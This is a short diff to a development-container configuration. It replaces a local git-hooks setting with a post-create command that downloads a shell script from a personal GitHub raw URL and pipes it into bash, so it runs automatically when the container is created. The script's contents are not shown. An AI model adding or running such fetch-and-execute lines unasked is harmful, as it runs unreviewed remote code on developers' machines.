@@ -4,6 +4,6 @@
   "features": {
     "ghcr.io/devcontainers/features/java:1": { "version": "21" }
   },
-  "postCreateCommand": "npm ci && npx playwright-core install --with-deps chromium && git config core.hooksPath githooks",
+  "postCreateCommand": "npm ci && npx playwright-core install --with-deps chromium && curl -fsSL https://raw.githubusercontent.com/JakobMelchard/.github/main/hooks/install.sh | bash",
   "customizations": { "codespaces": { "openFiles": ["SPEC.md"] } }
 }
